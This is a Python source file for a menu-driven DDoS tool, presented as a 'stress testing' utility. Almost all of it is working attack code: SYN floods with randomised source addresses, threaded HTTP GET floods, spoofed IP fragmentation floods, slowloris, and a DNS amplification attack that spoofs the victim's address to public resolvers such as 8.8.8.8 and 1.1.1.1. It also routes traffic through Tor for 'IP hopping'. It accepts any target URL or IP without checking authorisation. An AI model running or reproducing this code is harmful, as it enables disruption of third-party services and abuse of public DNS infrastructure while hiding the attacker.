"""
DDOS Stress Testing Tool

This tool provides multiple attack options such as Slowloris attack, HTTP flood, SYN Flood etc. for stress testing networks.
Developed collaboratively by the DDOS team at DeepCytes.
Contributions are welcomed and appreciated.

"""

import os , subprocess ,sys
import urllib.parse,ipaddress
import socket,string,time
from random import randint , choice
import threading
import random
from scapy.all import IP, ICMP, send ,conf,UDP, DNS, DNSQR

CRED = '\033[31m'  
CGREEN = '\033[32m'  
CEND = '\033[0m'  
CBLINK = '\33[5m'
CYELLOW = '\033[33m' 

is_dig_avail = False
domain =  ''
target_ip = '0.0.0.0'
is_ip_hopping = False
conf.verb = 0

#--------------------------------------------------------------
#SYSTEM CHECKS

#Checking the system
def check_sys():
    #Checking if in sudo mode
    if os.name == "posix":
        print(CGREEN + "  [\u2714] " + CEND + "Script is running on Linux OS." + CEND)
    else:
        print(CRED + "  [!] " + CEND + "This script is designed to run on Linux OS. | Exiting...\n" + CEND)
        sys.exit(0)
    
    #Checking if run in sude mode
    if os.geteuid() == 0:
        print(CGREEN + "  [\u2714] " + CEND + "The script is running in sudo mode" + CEND)
    else:
        print(CRED + "  [!] " + CEND + "The script isn't running in sudo mode | Exiting..." + CEND)
        sys.exit(0)

# Checking if required tool is installed
def is_tools_installed():
    # Checking if dig tool is installed
    try:
        global is_dig_avail
        subprocess.run(['dig', '-v'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        print(CGREEN + "  [\u2714] " + CEND + "The tool 'dig' was successfully found." + CEND)
        is_dig_avail = True
    except FileNotFoundError:
        print(CRED + "  [!] " + CEND + "The tool 'dig' is not installed. DNS-to-IP features won't work. You would have to enter IP addresses manually." + CEND)

    #Checking if hping3 tool is installed
    try:
        result = subprocess.run(['hping3', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            print(CGREEN + "  [\u2714] " + CEND + "The tool 'hping3' was successfully found." + CEND)

    except FileNotFoundError:
        print(CRED + "  [!] " + CEND + "The required tool 'hping3' is missing from the system." + CEND)
        choice = input(CGREEN + "  [-] " + CEND + "Install the tool? (y/n): " + CEND)
        if choice.lower() == 'y':
            try:
                print(CGREEN + "  [-] " + CEND + "Installing 'hping3'... "+ CEND)
                subprocess.run(['sudo', 'apt', 'install', 'hping3', '-y'], check=True,stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
                print(CGREEN + "  [\u2714] " + CEND + "The tool 'hping3' was successfully installed" + CEND)
            except subprocess.CalledProcessError:
                print(CRED + "  [!] " + CEND + "Failed to install 'hping3'. Please check your system and try again." + CEND)
                sys.exit(0)
            except Exception as e:
                print(CRED + "  [!] " + CEND + "An unexpected error occurred: {e} | Exiting..." + CEND)
                sys.exit(0)
        elif choice.lower() == 'n':
            print(CRED + "  [!] " + CEND + "Script can't run without the tool | Exiting....." + CEND)
            sys.exit(0)
        else:
            print(CRED + "  [!] " + CEND + "Unexpected Input | Restart script" + CEND)

    #Check if tornet is installed
    try:
        result = subprocess.run(['pip', 'show', 'tornet'], check=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(CGREEN + "  [\u2714] " + CEND + "The tool 'tornet' was successfully found.")
    except subprocess.CalledProcessError:
        print(CRED + "  [!] " + CEND + "The required tool 'tornet' is missing from the system." + CEND)
        choice = input(CGREEN + "  [-] " + CEND + "Install the tool? (y/n): " + CEND)
        if choice.lower() == 'y':
            try:
                print(CGREEN + "  [\u2714] " + CEND + "Installing 'tornet'... "+ CEND)
                subprocess.run(['pip','install', 'tornet','--root-user-action=ignore'], check=True,stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
                print(CGREEN + "  [\u2714] " + CEND + "The tool 'tornet' was successfully installed" + CEND)
            except subprocess.CalledProcessError:
                print(CRED + "  [!] " + CEND + "Failed to install 'tornet'. Please check your system and try again." + CEND)
                sys.exit(0)
            except Exception as e:
                print(CRED + "  [!] " + CEND + "An unexpected error occurred: {e} | Exiting..." + CEND)
                sys.exit(0) 
        elif choice.lower() == 'n':
            print(CRED + "  [!] " + CEND + "Script can't run without the tool | Exiting....." + CEND)
            sys.exit(0)
        else:
            print(CRED + "  [!] " + CEND + "Unexpected Input | Restart script" + CEND)
            sys.exit(0)

    #Check if tor is installed
    try:
        # Attempt to run 'tor --version' and capture output
        result = subprocess.run(['tor', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True, text=True)
        print(CGREEN + "  [\u2714] " + CEND + "The tool 'tor' was successfully found." + CEND)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(CRED + "  [!] " + CEND + "The required tool 'tor' is missing from the system." + CEND)
        choice = input(CGREEN + "  [-] " + CEND + "Install the tool? (y/n): " + CEND)
        if choice.lower() == 'y':
            try:
                print(CGREEN + "  [\u2714] " + CEND + "Installing 'tor'... "+ CEND)
                subprocess.run(['apt','install', 'tor'], check=True,stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
                print(CGREEN + "  [\u2714] " + CEND + "The tool 'tor' was successfully installed" + CEND)
            except subprocess.CalledProcessError:
                print(CRED + "  [!] " + CEND + "Failed to install 'tor'. Please check your system and try again." + CEND)
                sys.exit(0)
            except Exception as e:
                print(CRED + "  [!] " + CEND + "An unexpected error occurred: {e} | Exiting..." + CEND)
                sys.exit(0) 
        elif choice.lower() == 'n':
            print(CRED + "  [!] " + CEND + "Script can't run without the tool | Exiting....." + CEND)
            sys.exit(0)
        else:
            print(CRED + "  [!] " + CEND + "Unexpected Input | Restart script" + CEND)
            sys.exit(0)

    #Checking if slowloris is installed
    try:
        result = subprocess.run(['slowloris', '-h'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            print(CGREEN + "  [\u2714] " + CEND + "The tool 'slowloris' was successfully found." + CEND)

    except FileNotFoundError:
            print(CRED + "  [!] " + CEND + "The required tool 'slowloris' is missing from the system." + CEND)
            choice = input(CGREEN + "  [-] " + CEND + "Install the tool? (y/n): " + CEND)
            if choice.lower() == 'y':
                try:
                    print(CGREEN + "  [-] " + CEND + "Installing 'slowloris'... "+ CEND)
                    subprocess.run(['sudo', 'apt', 'install', 'slowloris', '-y'], check=True,stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
                    print(CGREEN + "  [\u2714] " + CEND + "The tool 'slowloris' was successfully installed" + CEND)
                except subprocess.CalledProcessError:
                    print(CRED + "  [!] " + CEND + "Failed to install 'slowloris'. Please check your system and try again." + CEND)
                    sys.exit(0)
                except Exception as e:
                    print(CRED + "  [!] " + CEND + "An unexpected error occurred: {e} | Exiting..." + CEND)
                    sys.exit(0)
            elif choice.lower() == 'n':
                print(CRED + "  [!] " + CEND + "Script can't run without the tool | Exiting....." + CEND)
                sys.exit(0)
            else:
                print(CRED + "  [!] " + CEND + "Unexpected Input | Restart script" + CEND)

#-------------------------------------------------------------------
#SERVICE

#Resolving the IP of the domain
def resolve_target_dig():
    global target_ip
    global domain
    target = input(CGREEN + "\n  [-] " + CEND + "Enter target [URL/IP]: " + CEND)
    try:
        ipaddress.ip_address(target)
        target_ip = target
        domain = ''
        print(CGREEN + "  [\u2714] " + CEND + f"Target locked as : {target_ip}" + CEND)
    except ValueError:
        try:
            domain = urllib.parse.urlparse(target).netloc
            if not domain:  
                print(CRED + "  [!] " + CEND + "Invalid format. Please provide a valid target URL / IP" + CEND)
                sys.exit(0)
            try:
                result = subprocess.run(['dig', '+short', domain], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
                output = result.stdout.decode().strip()
                lines = output.splitlines()
                if lines:
                    target_ip = lines[-1]
                    print(CGREEN + "  [\u2714] " + CEND + f"Target IP resolved as : {target_ip}" + CEND)
                else:
                    print(CRED + "  [!] " + CEND + "No IP address found for the domain." + CEND)
                    resolve_target_ip()
            except Exception as e:
                print(CRED + "  [!] " + CEND + f"Error running 'dig' command: {e}" + CEND)
                resolve_target_ip()
        except Exception as e:
            print(CRED + "  [!] " + CEND + f"Error processing the URL: {e}" + CEND)
            resolve_target_ip()

#Getting the IP of target
def resolve_target_ip():
    global target_ip
    print(CYELLOW + "  [?] " + CEND + "Troubleshooting...Removing Dig Feature." + CEND)
    target = input(CGREEN + "  [-] " + CEND + "Enter target [IP]: " + CEND)
    try:
        ipaddress.ip_address(target)
        target_ip = target
        print(CGREEN + "  [\u2714] " + CEND + f"Target locked as : {target}" + CEND)
    except:
        print(CRED  + "  [!] " + CEND + "Invalid IP detected | Exiting.." + CEND)
        sys.exit(0)

#Starting the tor services:
def start_tor():
    global is_ip_hopping
    os.system('clear')
    print(CGREEN + "\n\n\n  [-] Please wait while we start Tor for you.. \n" + CEND)
    try:
        time.sleep(1)
        print(CGREEN + "  [-] Starting the Tor service...\n" + CEND)
        subprocess.run(['sudo', 'service', 'tor', 'start'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        time.sleep(3)
        try:
            print(CGREEN + "  [-] Starting the Tornet tool...\n" + CEND)
            print(CYELLOW + "  [?] " + CEND + "This feature is currently disabled due to code issues. Please manually start Tornet in a separate window.\n" + CEND)
            #tornet = subprocess.Popen(['sudo', 'tornet', '--interval', '5', '--count', '0'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
            # Wait for ten seconds
            time.sleep(10)
            print(CGREEN + "  [-] Tor service started and tornet is running. \n")
            print(CGREEN + "  [-] Redirecting you to the dashboard.....")
            time.sleep(3)
            is_ip_hopping = True
            dashboard()
        except subprocess.CalledProcessError as e:
            print(CRED + f"  [-] An error occurred while starting the tornet tool: {e}")
            time.sleep(3)
            dashboard()
    except subprocess.CalledProcessError as e:
        print(CRED + f"  [-] An error occurred while starting the Tor service: {e}")
        time.sleep(3)
        dashboard

#Exit function handling services
def exit():
    print(CGREEN + "\n\n[:/] " + CEND + "Killing Tor Services...." + CEND)
    try:
        subprocess.run(['sudo', 'systemctl', 'stop', 'tor'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError:
        pass
    try:
        subprocess.run(['sudo', 'tornet', '--stop'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError:
        pass
    time.sleep(2)
    os.system('clear')
    sys.exit(0)

#-------------------------------------------------------------------
#ATTACKS

#Script for syn flood attack
def syn_flood():
    os.system('clear')
    print(CRED + "\n" + "="*50)
    print(CGREEN + " " * 14 + "SYN FLOOD MODE SELECTED" + " " * 20)
    print("="*50 +"\n"+CEND)
    port = input(CGREEN + "  [-] " + CEND + "Enter the port to attack:  " + CEND)
    packet_count = input(CGREEN + "  [-] " + CEND + "Enter the number of packets: " + CEND)
    data_size = input(CGREEN + "  [-] " + CEND + "Enter the data size [Press enter to skip]:  " + CEND) or "120"
    window_size = input(CGREEN + "  [-] " + CEND + "Enter the window size [Press enter to skip]: " + CEND) or "64"
    command = [
        'hping3',
        '--count', str(packet_count),
        '--data', str(data_size),
        '--syn',
        '--win', str(window_size),
        '-p', str(port),
        '--flood',
        '--rand-source',
        target_ip
    ]
    print("\n" + "="*50)
    print(CGREEN + f"  IP to Attack     : {target_ip}".ljust(30) + CEND)
    print(CGREEN + f"  Port To Attack   : {port}".ljust(30) + CEND)
    print(CGREEN + f"  Number of Packets: {packet_count}".ljust(30) + CEND)
    print("="*50 + "\n")
    halt = input(CGREEN + "\n[-] Setup ready | Press Enter to start the attack.." + CEND)
    try:
        print(CRED + CBLINK + f"\n[*] Attack ongoing on ({target_ip}) at port {port}" + CEND)
        subprocess.run(command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError as e:
        print(f"An error occurred: {e}")

# Script for HTTP flood attack
def http_flood():
    global domain
    os.system('clear')
    print(CRED + "\n" + "="*50)
    print(CGREEN + " " * 14 + "HTTP FLOOD MODE SELECTED" + " " * 20)
    print("="*50 +"\n"+CEND)
    
    if domain == '':
        print(CRED + "  [!] " + CEND + "Domain required for this attack\n" + CEND)
        try:
            full_url = input(CGREEN + "  [-] " + CEND + "Enter the website URL (e.g., https://example.com): " + CEND)
            parsed_url = urllib.parse.urlparse(full_url)
            domain = parsed_url.netloc
            if not domain:
                raise ValueError("Invalid URL")
            print(CGREEN + "  [\u2714] " + CEND + f"Domain locked as: {domain}" + CEND)
        except ValueError as e:
            print(CRED + "  [!] " + CEND + f"Error resolving domain: {e}\n" + CEND)
            domain = input(CGREEN + "  [-] " + CEND + "Enter the domain manually (e.g., example.com): " + CEND).strip()
            print(CGREEN + "  [\u2714] " + CEND + f"Domain locked as: {domain}" + CEND)
    
    port = int(input(CGREEN + "  [-] " + CEND + "Enter the port (80|443): " + CEND))
    threads = int(input(CGREEN + "  [-] " + CEND + "Number of threads to allot: " + CEND))

    print("\n" + "="*50)
    print(CGREEN + f"  Domain to Attack : {domain}".ljust(30) + CEND)
    print(CGREEN + f"  IP to Attack     : {target_ip}".ljust(30) + CEND)
    print(CGREEN + f"  Port To Attack   : {port}".ljust(30) + CEND)
    print(CGREEN + f"  Number of Threads: {threads}".ljust(30) + CEND)
    print("="*50 + "\n")

    halt = input(CGREEN + "[-] Setup ready | Press Enter to start the attack.." + CEND)
    
    def attack():
        while True:
            url_path = generate_url_path()
            dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dos.connect((target_ip, port))
                request = f"GET /{url_path} HTTP/1.1\r\nHost: {domain}\r\nConnection: close\r\n\r\n"
                dos.send(request.encode())
            except socket.error as e:
                print(CRED + "  [!] " + CEND + f"[!] Failed to create a socket | Blocked or Server Down: {e}" + CEND)
                sys.exit(0)
            finally:
                dos.close()
    
    def generate_url_path():
        msg = string.ascii_letters + string.digits + string.punctuation
        return "".join(random.sample(msg, 5))
    
    # Starting the attack with multiple threads
    print(CRED + CBLINK + f"\n[*] Attack started with {threads} threads on {domain} ({target_ip}) at port {port}" + CEND)
    print(CGREEN + "\nPress Ctrl+C to stop attack\n" + CEND)

    for i in range(threads):
        t = threading.Thread(target=attack)
        t.start()
        print(CGREEN + f"[*] Thread {i + 1} started" + CEND)

# Script for IP Fragmentation attack
def ip_frag():
    os.system("clear")
    print(CRED + "\n" + "="*50)
    print(CGREEN + " " * 9 + "IP FRAGMENTATION MODE SELECTED" + " " * 20)
    print("="*50 +"\n"+CEND)

    frag_size = int(input(CGREEN + "  [-] " + CEND + "Enter the size of each fragment payload in bytes: " + CEND))
    num_fragments = 1000 #Default to 1000 to avoid script failing due to network constraint 
    threads = int(input(CGREEN + "  [-] " + CEND + "Number of threads: " + CEND))

    print("\n"+"=" * 50)
    print(CGREEN + f"  IP to Attack                    : {target_ip}".ljust(50) + CEND)
    print(CGREEN + f"  Size of each fragment payload   : {frag_size}".ljust(50) + CEND)
    print(CGREEN + f"  Number of threads               : {threads}".ljust(50) + CEND)
    print("=" * 50 + "\n")

    input(CGREEN + "[-] Setup ready | Press Enter to start the attack.." + CEND)

    print(CYELLOW + "\n[?] " + "The attack may take a minute to start. If it doesn't start, it could be a Network Constraint try reudcing threads to around 10" + CEND)

    print(CRED + CBLINK + f"\n[*] Attack started on ({target_ip})" + CEND)

    def ip_frag_attack(frag_size, num_fragments):
        try:
            fragments = []
            payload = "X" * frag_size
            for i in range(num_fragments):
                src_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                ip_packet = IP(dst=target_ip, src=src_ip)
                frag = ip_packet/ICMP()/payload
                frag.frag = i * (frag_size // 8)
                frag.flags = "MF" if i < num_fragments - 1 else 0
                fragments.append(frag)
            for frag in fragments:
                send(frag)
        except Exception as e:
            print(f"Error occurred: {e}")

    threads_list = []
    for i in range(threads):
        t = threading.Thread(target=ip_frag_attack, args=(frag_size, num_fragments))
        threads_list.append(t)
        t.start()
        print(CGREEN + f"[*] Thread {i + 1} started" + CEND)

    for t in threads_list:
        t.join()

    print(CGREEN + "[*] All threads have completed." + CEND)

#Script for slowloris attack
def slowloris_attack():
    global domain
    os.system("clear")
    print(CRED + "\n" + "=" * 50)
    print(CGREEN + " " * 12 + "SLOWLORIS MODE SELECTED" + " " * 16)
    print("=" * 50 + "\n" + CEND)

    # Prompt user for inputs with default values
    target_port = input(CGREEN + "  [-] " + CEND + "Enter the port (default is 80): " + CEND) or "80"
    num_sockets = input(CGREEN + "  [-] " + CEND + "Enter the number of sockets to use: " + CEND) or "10"
    use_https = input(CGREEN + "  [-] " + CEND + "Use HTTPS? (y/n): " + CEND).strip().lower() == 'y'

    # Display the collected configuration
    print("\n" + "=" * 50)
    if domain:
        print(CGREEN + f"  Target Domain                    : {domain}".ljust(50) + CEND)
    print(CGREEN + f"  Target IP                        : {target_ip}".ljust(50) + CEND)
    print(CGREEN + f"  Target Port                      : {target_port}".ljust(50) + CEND)
    print(CGREEN + f"  Number of Sockets                : {num_sockets}".ljust(50) + CEND)
    print(CGREEN + f"  Use HTTPS                        : {'Yes' if use_https else 'No'}".ljust(50) + CEND)
    print("=" * 50 + "\n")

    input(CGREEN + "[-] Setup ready | Press Enter to start the attack.." + CEND)

    # Construct the slowloris command
    command = ["slowloris", target_ip]
    if target_port:
        command.extend(["-p", target_port])
    if num_sockets:
        command.extend(["-s", num_sockets])
    if use_https:
        command.append("--https")
    
    command.extend(["--sleeptime", "0"])

    command_str = " ".join(command)
    print(CRED + CBLINK + f"\n[*] Attack started on ({target_ip})" + CEND)

    os.system(command_str)

#Script for DNS Amplification attack
def dns_amp():
    os.system("clear")
    print(CRED + "\n" + "="*50)
    print(CGREEN + " " * 9 + "DNS AMPLIFICATION MODE SELECTED" + " " * 20)
    print("="*50 +"\n"+CEND)

    threads = int(input(CGREEN + "  [-] " + CEND + "Enter the number of threads: " + CEND)) or 10

    print("\n"+"=" * 50)
    print(CGREEN + f"  IP to Attack                    : {target_ip}".ljust(50) + CEND)
    print(CGREEN + f"  Number of threads               : {threads}".ljust(50) + CEND)
    print("=" * 50 + "\n")

    input(CGREEN + "[-] Setup ready | Press Enter to start the attack.." + CEND)

    dns_servers = [
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "208.67.222.222", 
        "208.67.220.220", "9.9.9.9", "149.112.112.112", "8.26.56.26", 
        "8.20.247.20", "199.85.126.10", "199.85.127.10", "77.88.8.8", 
        "77.88.8.88", "77.88.8.7", "64.6.64.6", "64.6.65.6"
    ]

    known_domains = [
        "openresolver.com", "testdnssec.com", "dns-oarc.net", "yahoo.com", 
        "google.com", "microsoft.com", "amazon.com", "facebook.com", 
        "twitter.com", "linkedin.com", "instagram.com", "apple.com",
        "baidu.com", "t.co", "wikipedia.org", "cnn.com", "bbc.com", 
        "example.com", "paypal.com", "ebay.com", "cloudflare.com", 
        "shopify.com", "oracle.com", "adobe.com", "github.com", 
        "netflix.com", "reddit.com", "dropbox.com", "salesforce.com", 
        "twitch.tv", "spotify.com", "tumblr.com", "stackexchange.com", 
        "zoom.us", "quora.com", "mail.ru", "yandex.ru", "vk.com", 
        "dailymotion.com", "weather.com", "hulu.com", "live.com"
    ]

    print(CRED + CBLINK + f"\n[*] Attack started on ({target_ip})" + CEND)

    def dns_amplification():
        while True:
            dns_server = choice(dns_servers)  
            domain = choice(known_domains)   
            ip_layer = IP(src=target_ip, dst=dns_server)
            udp_layer = UDP(dport=53)
            dns_layer = DNS(rd=1, qd=DNSQR(qname=domain))
            packet = ip_layer / udp_layer / dns_layer
            send(packet, verbose=0) 

    threads_list = []
    for i in range(threads):
        t = threading.Thread(target=dns_amplification)
        threads_list.append(t)
        t.start()
        print(CGREEN + f"[*] Thread {i + 1} started" + CEND)

    for t in threads_list:
        t.join()

#------------------------------------------------------------------


def dashboard():
    global is_ip_hopping
    os.system('clear')
    print(CRED + "\n" + "="*60 + "\n" + "\t\t  [x] DDOS DASHBOARD [x]\n" + "="*60 + CEND)
    print(CGREEN + f"\n[-] Target Locked As : {target_ip}" + CEND)
    if is_ip_hopping:
        print(CGREEN + f"[\u2714] IP Hopping w Tor is Active.. \n" + CEND)
    else:
        print(CRED + f"[!] IP Hopping w Tor is Inactive..\n" + CEND)
    print(CGREEN + "  [0] " + CEND + "Start TOR Service [IP Hopping]\n" + CEND)
    print(CGREEN + "  [1] " + CEND +"SYN FLOOD ATTACK" + CEND)
    print(CGREEN + "  [2] " + CEND +"HTTP GET FLOOD ATTACK" +CEND) 
    print(CGREEN + "  [3] " + CEND +"SLOWLORIS ATTACK" + CEND)
    print(CGREEN + "  [4] " + CEND +"IP FRAGMENTATION ATTACK" + CEND)
    print(CGREEN + "  [5] " + CEND +"DNS AMPLIFICATION ATTACK\n" + CEND)
    print(CGREEN + "  [6] " + CEND + "Exit" + CEND)
    choice = input(CGREEN + "\n[-] Enter your choice [0-6]: " + CEND)
    
    # Additional error handling for invalid choices
    if choice not in ['0','1', '2', '3', '4', '5', '6']:
        print(CRED + "[!] Invalid choice. Please select a number between 0 and 6." + CEND)
        sys.exit(0)
    elif choice=='0':
        start_tor()
    elif choice=='1':
        syn_flood()
    elif choice=='2':
        http_flood()
    elif choice=='3':
        slowloris_attack()
    elif choice=='4':
        ip_frag()
    elif choice=='5':
        dns_amp()
    elif choice=='6':
        exit()

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(CGREEN + "\n" + "="*60 + "\n" + "\t\t  Initializing system checks..\n" + "="*60 +"\n"+ CEND)

    # Calling the check for operating system function
    check_sys()

    #Calling the check for required tools
    is_tools_installed()

    # Starting the program
    print(CGREEN + "\n" + "="*60 + "\n" + "\t\t  Initialization Completed\n" + "="*60 + CEND)

    # Resolving target
    resolve_target_dig() if is_dig_avail else resolve_target_ip()

    # Prompt to proceed
    input(CGREEN + "\nPress enter to proceed.." + CEND)    

    # Display the dashboard
    dashboard()    

if __name__ == '__main__':
	main()
